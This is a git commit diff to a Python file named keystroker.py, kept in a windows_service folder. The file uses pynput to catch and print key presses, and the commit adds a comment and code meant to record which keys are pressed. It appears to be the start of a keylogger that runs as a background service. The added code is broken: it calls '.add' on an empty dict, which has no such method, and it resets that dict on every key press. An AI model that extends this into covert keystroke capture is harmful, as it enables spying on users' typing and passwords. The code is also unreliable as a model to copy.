350eba5939062144eafca1fb8d53478acf389e5b
gar7mn <gar7mn@missouri.edu>
2024-09-29 13:30:05 -0500

    added comments and updated requirements

--- windows_service/keystroker.py
+++ windows_service/keystroker.py
@@ -1,8 +1,11 @@
 from pynput import *
-
+#these will need to be modified to add what to do when someone presses a key
 def on_press(key):
+    pressed = {}
     try:
         print('key: {0} pressed '.format(key.char))
+        pressed.add('{0}'.format(key.char))
+        
     except AttributeError:
         print('special key {0} pressed'.format(key))
         
